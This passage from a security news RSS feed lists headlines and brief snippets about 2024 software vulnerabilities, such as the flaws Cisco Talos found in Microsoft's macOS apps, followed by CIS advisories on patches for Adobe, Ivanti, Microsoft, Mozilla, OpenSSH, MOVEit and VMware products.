<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.scmagazine.com/brief/cisa-attacks-leveraging-critical-solarwinds-rce-underway&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw2b-53OsR8ia7Fap7_jzWDU</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.scmagazine.com/brief/cisa-attacks-leveraging-critical-solarwinds-rce-underway&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw2b-53OsR8ia7Fap7_jzWDU</guid>
<content:encoded><![CDATA[
The RCE <b>vulnerability</b> was leveraged in ransomware attacks targeting Indian banks. Open finder app in <b>macOs</b> &middot; Application security &middot; Bugs in Microsoft&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T02:22:20Z</pubDate>
</item>
<item>
<title><b>Vulnerability</b> in Microsoft apps allowed hackers to spy on Mac users - 9to5Mac</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://9to5mac.com/2024/08/19/vulnerability-microsoft-apps-mac/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0LLQ1x2EUlsMNaIprAJrYs</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://9to5mac.com/2024/08/19/vulnerability-microsoft-apps-mac/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0LLQ1x2EUlsMNaIprAJrYs</guid>
<content:encoded><![CDATA[
“We identified eight <b>vulnerabilities</b> in various Microsoft applications for <b>macOS</b>, through which an attacker could bypass the operating system's&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T23:43:22Z</pubDate>
</item>
<item>
<title>Critical Jenkins <b>vulnerability</b> added to CISA's known <b>vulnerabilities</b> catalog | SC Media</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.scmagazine.com/news/critical-jenkins-vulnerability-added-to-cisas-known-vulnerabilities-catalog&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw164dXlosaPZF0HuAJSqfpj</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.scmagazine.com/news/critical-jenkins-vulnerability-added-to-cisas-known-vulnerabilities-catalog&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw164dXlosaPZF0HuAJSqfpj</guid>
<content:encoded><![CDATA[
Security pros say the flaws in six apps for <b>macOS</b> could let attackers take over cameras, microphones and screen recordings. A SolarWinds sign sits on&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T21:55:22Z</pubDate>
</item>
<item>
<title><b>macOS</b> Users at Risk of <b>Vulnerabilities</b> in Microsoft Apps: Researchers - iPhone in Canada</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.iphoneincanada.ca/2024/08/19/macos-microsoft-security-vulnerabilities/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0pzwx2qepWOsRYHMkSCcJh</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.iphoneincanada.ca/2024/08/19/macos-microsoft-security-vulnerabilities/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0pzwx2qepWOsRYHMkSCcJh</guid>
<content:encoded><![CDATA[
Cisco Talos discovered these <b>vulnerabilities</b> as part of a recent analysis its researchers conducted of <b>macOS's</b> permission-based security model, which&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T21:02:36Z</pubDate>
</item>
<item>
<title>Bugs in Microsoft apps for <b>macOS</b> could give privileges to attackers | SC Media</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.scmagazine.com/news/bugs-in-microsoft-apps-for-macos-could-give-privileges-to-attackers&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3ngRKZcg9g9bCFRUZXIiqk</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.scmagazine.com/news/bugs-in-microsoft-apps-for-macos-could-give-privileges-to-attackers&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3ngRKZcg9g9bCFRUZXIiqk</guid>
<content:encoded><![CDATA[
Eight <b>vulnerabilities</b> in six leading Microsoft applications for <b>macOS</b> — including Outlook, Teams, PowerPoint, OneNote, Excel and Word — can let&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T19:33:10Z</pubDate>
</item>
<item>
<title>Bugs in Microsoft <b>macOS</b> apps open door to camera, mic access • The Register - Theregister</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.theregister.com/2024/08/19/cisco_talos_microsoft_macos/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3fCYXC-pPKUE73J-XqKmvj</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.theregister.com/2024/08/19/cisco_talos_microsoft_macos/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3fCYXC-pPKUE73J-XqKmvj</guid>
<content:encoded><![CDATA[
Cisco Talos says eight <b>vulnerabilities</b> in Microsoft's <b>macOS</b> apps could be abused by nefarious types to record video and sound from a user's device&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T19:05:37Z</pubDate>
</item>
<item>
<title>Microsoft <b>vulnerabilities</b> have sprung up in Apple's walled garden, investigators claim</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.thestack.technology/microsoft-vulnerabilities-have-sprung-up-in-apples-walled-garden-investigators-claim/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0LKd_rC2fKAbzQcCZ2xyDT</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.thestack.technology/microsoft-vulnerabilities-have-sprung-up-in-apples-walled-garden-investigators-claim/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0LKd_rC2fKAbzQcCZ2xyDT</guid>
<content:encoded><![CDATA[
... <b>vulnerabilities</b> in Microsoft software for Apple's <b>MacOS</b>. Investigators claimed to have discovered eight bugs in Microsoft applications for the&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T17:58:05Z</pubDate>
</item>
<item>
<title>Microsoft <b>macOS</b> Apps <b>Vulnerability</b> Allows Hackers to Record Audio/Video</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://cybersecuritynews.com/microsoft-macos-apps-vulnerability/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1OSkcTOVd36UUNSUtycNF0</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://cybersecuritynews.com/microsoft-macos-apps-vulnerability/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1OSkcTOVd36UUNSUtycNF0</guid>
<content:encoded><![CDATA[
Cisco Talos has identified eight security <b>vulnerabilities</b> in Microsoft applications running on the <b>macOS</b> operating system, raising concerns about&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T16:22:17Z</pubDate>
</item>
<item>
<title>AI SPERA and Hackers Central Partner to Expand Mexico's Security Market with 'Criminal IP ASM'</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://cybersecuritynews.com/mexicos-security-market-with-criminal-ip-asm/amp/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw24FokFCRth_mhH7a9RqUba</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://cybersecuritynews.com/mexicos-security-market-with-criminal-ip-asm/amp/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw24FokFCRth_mhH7a9RqUba</guid>
<content:encoded><![CDATA[
Microsoft <b>macOS</b> Apps <b>Vulnerability</b> Allows Hackers to Record Audio/Video. Cisco Talos has identified eight security <b>vulnerabilities</b> in Microsoft&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T16:05:43Z</pubDate>
</item>
<item>
<title>Security flaws in Microsoft Mac apps could let attackers spy on users - AppleInsider</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://appleinsider.com/articles/24/08/19/security-flaws-in-microsoft-mac-apps-could-let-attackers-spy-on-users&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1HC1Swld_tAnn-ETkzySif</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://appleinsider.com/articles/24/08/19/security-flaws-in-microsoft-mac-apps-could-let-attackers-spy-on-users&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1HC1Swld_tAnn-ETkzySif</guid>
<content:encoded><![CDATA[
Cisco Talos recently uncovered security <b>vulnerabilities</b> in several Microsoft apps for <b>macOS</b> that can potentially let attackers spy on your camera&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T14:52:50Z</pubDate>
</item>
<item>
<title>Microsoft Apps for <b>macOS</b> Exposed to Library Injection Attacks - Infosecurity Magazine</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.infosecurity-magazine.com/news/microsoft-apps-macos-exposed/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3xHxQoMdj4Q30M-K_JUvab</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.infosecurity-magazine.com/news/microsoft-apps-macos-exposed/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3xHxQoMdj4Q30M-K_JUvab</guid>
<content:encoded><![CDATA[
Eight Microsoft applications for <b>macOS</b> are <b>vulnerable</b> to library injection attacks, potentially allowing adversaries to steal app permissions and&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T14:15:40Z</pubDate>
</item>
<item>
<title>Security flaw in Microsoft's <b>macOS</b> apps may allow hackers to spy on users - Times of India</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://timesofindia.indiatimes.com/technology/tech-news/security-flaw-in-microsofts-macos-apps-may-allow-hackers-to-spy-on-users-claims-researchers/articleshow/112630001.cms&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0huziOVIHA8LGAMmfGFj3y</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://timesofindia.indiatimes.com/technology/tech-news/security-flaw-in-microsofts-macos-apps-may-allow-hackers-to-spy-on-users-claims-researchers/articleshow/112630001.cms&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0huziOVIHA8LGAMmfGFj3y</guid>
<content:encoded><![CDATA[
Researchers have allegedly discovered multiple security flaws in the Microsoft apps available for <b>macOS</b>. These <b>vulnerabilities</b> could potentially&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T13:44:53Z</pubDate>
</item>
<item>
<title><b>Vulnerabilities</b> in Microsoft's <b>macOS</b> apps could help hackers access microphones and cameras</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://therecord.media/microsoft-macos-apps-vulnerabilities-cisco&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw02pNdR1kYr8hljArDxl7W0</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://therecord.media/microsoft-macos-apps-vulnerabilities-cisco&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw02pNdR1kYr8hljArDxl7W0</guid>
<content:encoded><![CDATA[
Researchers said they discovered eight <b>vulnerabilities</b> in a range of Microsoft applications for <b>macOS</b>, including Teams, Outlook, Word, PowerPoint,&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T13:03:54Z</pubDate>
</item>
<item>
<title>0.0.0.0 Day: 18-Year-Old Browser Flaw Affects Linux and <b>macOS</b> - Security Boulevard</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://securityboulevard.com/2024/08/0-0-0-0-day-18-year-old-browser-flaw-affects-linux-and-macos/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3LD7CsnlMUMmjc4fjOZwya</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://securityboulevard.com/2024/08/0-0-0-0-day-18-year-old-browser-flaw-affects-linux-and-macos/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3LD7CsnlMUMmjc4fjOZwya</guid>
<content:encoded><![CDATA[
Oligo Security's research team recently uncovered a critical <b>vulnerability</b> dubbed the “0.0.0.0 Day” affecting Chromium, Firefox,&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T12:06:04Z</pubDate>
</item>
<item>
<title>Serious flaws in Microsoft apps on <b>macOS</b> could let hackers spy on users | ITPro</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.itpro.com/security/serious-flaws-in-microsoft-apps-on-macos-could-let-hackers-spy-on-users&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1Ubmi4XFZDdw4StZNvDyJY</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.itpro.com/security/serious-flaws-in-microsoft-apps-on-macos-could-let-hackers-spy-on-users&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1Ubmi4XFZDdw4StZNvDyJY</guid>
<content:encoded><![CDATA[
The <b>vulnerabilities</b> can be exploited by injecting malicious libraries into Microsoft applications to gain entitlements and user-granted permissions.
]]></content:encoded>
<pubDate>2024-08-19T10:17:25Z</pubDate>
</item>
<item>
<title>Remote <b>vulnerability</b> discovered in Android phones - iLounge</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.ilounge.com/news/remote-vulnerability-discovered-in-android-phones&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1e-Y1ATF4rhONjhRZR-VTr</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.ilounge.com/news/remote-vulnerability-discovered-in-android-phones&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1e-Y1ATF4rhONjhRZR-VTr</guid>
<content:encoded><![CDATA[
A new remote <b>vulnerability</b> was discovered to exist in Android ... Repeat permissions required for <b>macOS</b> Sequoia screen recording users. 1&nbsp;...
]]></content:encoded>
<pubDate>2024-08-19T04:08:28Z</pubDate>
</item>
<item>
<title>New Banshee Stealer <b>macOS</b> Malware Priced at $3,000 Per Month - SecurityWeek</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.securityweek.com/new-banshee-stealer-macos-malware-priced-at-3000-per-month/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3c40Oya2MQfFmrwoHDFFng</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.securityweek.com/new-banshee-stealer-macos-malware-priced-at-3000-per-month/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3c40Oya2MQfFmrwoHDFFng</guid>
<content:encoded><![CDATA[
“While Banshee Stealer is not overly complex in its design, its focus on <b>macOS</b> ... AMD Says New Sinkclose CPU <b>Vulnerability</b> Only Affects 'Seriously&nbsp;...
]]></content:encoded>
<pubDate>2024-08-16T12:06:50Z</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Adobe Products Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-adobe-products-could-allow-for-arbitrary-code-execution_2024-091</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-adobe-products-could-allow-for-arbitrary-code-execution_2024-091</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Adobe products, the most severe of which could allow for arbitrary code execution.</p>
<p>Adobe is a software that is used for creating and publishing a wide variety of contents including graphics, photography, illustration, animation, multimedia, motion pictures and print. </p>
<p>Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights</p>
]]></content:encoded>
<pubDate>Tue, 13 Aug 2024 19:48:03 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Ivanti Products Could Allow for Remote Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-ivanti-products-could-allow-for-remote-code-execution_2024-090</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-ivanti-products-could-allow-for-remote-code-execution_2024-090</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Ivanti products, the most severe of which could allow for remote code execution. </p>
<ul>
<li>Ivanti Avalanche is a mobile device management system. </li>
<li>Ivanti Neurons for ITSM is an IT Service Management Software.</li>
<li>Ivanti Virtual Traffic Manager is a software-based application delivery controller.</li>
</ul>
<p>Successful exploitation could allow for remote code execution in the context of the system. Depending on the privileges associated with the system, an attacker could then install programs; view, change, or delete data.</p>
]]></content:encoded>
<pubDate>Tue, 13 Aug 2024 16:30:54 -0400</pubDate>
</item>
<item>
<title>Critical Patches Issued for Microsoft Products, August 13, 2024</title>
<link>https://www.cisecurity.org/advisory/critical-patches-issued-for-microsoft-products-august-13-2024_2024-089</link>
<guid>https://www.cisecurity.org/advisory/critical-patches-issued-for-microsoft-products-august-13-2024_2024-089</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Microsoft products, the most severe of which could allow for remote code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 13 Aug 2024 15:13:39 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Mozilla Products Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-mozilla-products-could-allow-for-arbitrary-code-execution_2024-086</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-mozilla-products-could-allow-for-arbitrary-code-execution_2024-086</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Mozilla products, the most severe of which could allow for arbitrary code execution. Mozilla Firefox is a web browser used to access the Internet. Mozilla Firefox ESR is a version of the web browser intended to be deployed in large organizations. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 06 Aug 2024 15:02:02 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Cisco Secure Email Gateway Could Allow for Remote Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-cisco-secure-email-gateway-could-allow-for-remote-code-execution_2024-083</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-cisco-secure-email-gateway-could-allow-for-remote-code-execution_2024-083</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Cisco Secure Email Gateway that could allow for remote code execution. Cisco Secure Email Gateway is an email security product that uses signature analysis and machine learning to identify and block malicious emails before they reach recipients inboxes. Successful exploitation could allow the attacker to replace any file on the underlying file system. The attacker could then perform any of the following actions: add users with root privileges, modify the device configuration, execute arbitrary code, or cause a permanent denial of service (DoS) condition on the affected device.</p>
]]></content:encoded>
<pubDate>Mon, 22 Jul 2024 16:13:50 -0400</pubDate>
</item>
<item>
<title>Oracle Quarterly Critical Patches Issued July 16, 2024</title>
<link>https://www.cisecurity.org/advisory/oracle-quarterly-critical-patches-issued-july-16-2024_2024-082</link>
<guid>https://www.cisecurity.org/advisory/oracle-quarterly-critical-patches-issued-july-16-2024_2024-082</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Oracle products, the most severe of which could allow for remote code execution.</p>
]]></content:encoded>
<pubDate>Thu, 18 Jul 2024 14:50:13 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Mozilla Products Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-mozilla-products-could-allow-for-arbitrary-code-execution_2024-080</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-mozilla-products-could-allow-for-arbitrary-code-execution_2024-080</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Mozilla products, the most severe of which could allow for arbitrary code execution. Mozilla Firefox is a web browser used to access the Internet. Mozilla Firefox ESR is a version of the web browser intended to be deployed in large organizations. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 09 Jul 2024 18:38:40 -0400</pubDate>
</item>
<item>
<title>Critical Patches Issued for Microsoft Products, July 09, 2024</title>
<link>https://www.cisecurity.org/advisory/critical-patches-issued-for-microsoft-products-july-09-2024_2024-078</link>
<guid>https://www.cisecurity.org/advisory/critical-patches-issued-for-microsoft-products-july-09-2024_2024-078</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Microsoft products, the most severe of which could allow for remote code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 09 Jul 2024 15:32:14 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Adobe Products Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-adobe-products-could-allow-for-arbitrary-code-execution_2024-079</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-adobe-products-could-allow-for-arbitrary-code-execution_2024-079</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Adobe products, the most severe of which could allow for arbitrary code execution.</p>
<ul>
<li>Adobe Premiere Pro is a timeline-based and non-linear video editing software application.</li>
<li>Adobe InDesign is a desktop publishing and page layout designing software application.</li>
<li>Adobe Bridge is a free digital asset management application.</li>
</ul>
<p>Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights</p>
]]></content:encoded>
<pubDate>Tue, 09 Jul 2024 15:31:24 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in OpenSSH Could Allow for Remote Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-openssh-could-allow-for-remote-code-execution_2024-077</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-openssh-could-allow-for-remote-code-execution_2024-077</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in OpenSSH that could allow for remote code execution. OpenSSH is a suite of secure networking utilities based on the SSH protocol and is crucial for secure communication over unsecured networks. It is widely used in enterprise environments for remote server management, secure file transfers, and various DevOps practices. Successful exploitation of this vulnerability could allow for remote code execution in the context of the unprivileged user running the sshd server. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.</p>
]]></content:encoded>
<pubDate>Tue, 09 Jul 2024 14:37:57 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in OpenSSH Could Allow for Remote Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-openssh-could-allow-for-remote-code-execution_2024-076</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-openssh-could-allow-for-remote-code-execution_2024-076</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in OpenSSH, which could allow for remote code execution. OpenSSH is a suite of secure networking utilities based on the SSH protocol and is crucial for secure communication over unsecured networks. It is widely used in enterprise environments for remote server management, secure file transfers, and various DevOps practices. Successful exploitation of this vulnerability could allow for remote code execution in the context of the administrator account. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.</p>
]]></content:encoded>
<pubDate>Mon, 01 Jul 2024 16:30:27 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Progress MOVEit Products Could Allow for Authentication Bypass</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-progress-moveit-products-could-allow-for-authentication-bypass_2024-075</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-progress-moveit-products-could-allow-for-authentication-bypass_2024-075</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in MOVEit products, which could allow for authentication bypass. </p>
<ul>
<li>MOVEit Gateway acts as a proxy between inbound connections from the public network and your internal trusted network.</li>
<li>MOVEit Transfer is a secure managed file transfer application.</li>
</ul>
<p>Successful exploitation of these vulnerabilities could allow for an attacker to bypass authentication. An attacker could then view, change, or delete data; or create new accounts with full user rights.</p>
]]></content:encoded>
<pubDate>Tue, 25 Jun 2024 15:58:34 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in VMware Products Could Allow for Remote Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-vmware-products-could-allow-for-remote-code-execution_2024-073</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-vmware-products-could-allow-for-remote-code-execution_2024-073</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in VMware vCenter Server and Cloud Foundation, the most severe of which could allow for remote code execution. VMware vCenter Server is the centralized management utility for VMware. VMware Cloud Foundation is a multi-cloud platform that provides a full-stack hyperconverged infrastructure (HCI) that is made for modernizing data centers and deploying modern container-based applications. Successful exploitation of these vulnerabilities could allow for remote code execution in the context of the administrator account. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.</p>
]]></content:encoded>
<pubDate>Tue, 18 Jun 2024 15:46:36 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Adobe Products Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-adobe-products-could-allow-for-arbitrary-code-execution_2024-071</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-adobe-products-could-allow-for-arbitrary-code-execution_2024-071</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Adobe products, the most severe of which could allow for arbitrary code execution.</p>
<ul>
<li>Adobe Photoshop is a raster graphics editor.</li>
<li>Adobe Experience Manager (AEM) is a comprehensive content management solution for building websites, mobile apps, and forms.</li>
<li>Adobe Audition is a comprehensive toolset that includes multitrack, waveform, and spectral display for creating, mixing, editing, and restoring audio content.</li>
<li>Adobe Media Encoder is an audio/video media processing program that allows users to convert files into other types of files.</li>
<li>Adobe FrameMaker Publishing Server is an enterprise software to automate multichannel publishing that lets you access publishing services remotely and output technical content in multiple formats and as mobile apps.</li>
<li>Adobe Commerce is a flexible and scalable commerce platform that lets you create personalized B2B and B2C experiences.</li>
<li>Adobe ColdFusion is a commercial rapid web-application development computing platform.</li>
<li>Adobe Substance 3D Stager a professional staging tool for scene design and rendering.</li>
<li>Adobe Creative Cloud is an assortment of applications and services created by Adobe that is ideal for photography, videography, design, and PDF creation.</li>
<li>Adobe Acrobat is a family of application software and Web services.</li>
</ul>
